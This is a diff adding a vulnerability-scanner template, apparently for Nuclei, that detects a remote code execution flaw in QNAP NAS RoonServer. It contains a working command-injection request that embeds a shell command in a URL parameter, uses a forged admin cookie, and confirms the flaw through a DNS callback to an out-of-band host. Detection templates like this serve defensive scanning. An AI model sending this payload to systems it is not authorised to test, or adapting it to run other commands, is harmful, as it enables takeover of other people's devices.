@@ -1,0 +1,35 @@
+id: qnap-nas-roonserver-rce
+info:
+  name: QNAP NAS RoonServer RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The QNAP security team has detected an attack campaign in the wild related to a vulnerability in Roon Server. QNAP NAS running the following versions of Roon Server may be susceptible to attack: Roon Server 2021-02-01 and earlier. Successful exploitation could allow an attacker to control the server and perform arbitrary operations.
+  reference:
+    - https://www.qnap.com.cn/en/security-advisory/QSA-21-17
+  tags: rce
+
+variables:
+  random_hex: "{{rand_text_alphanumeric(4)}}"
+  ping_url: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/qpkg/RoonServer/ajax/ajax.php?a=updateformfield&t=$(ping+-c+1+{{ping_url}}) HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+        Cookie: NAS_USER=admin
+    unsafe: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: word
+        part: header
+        words:
+          - "text/xml"
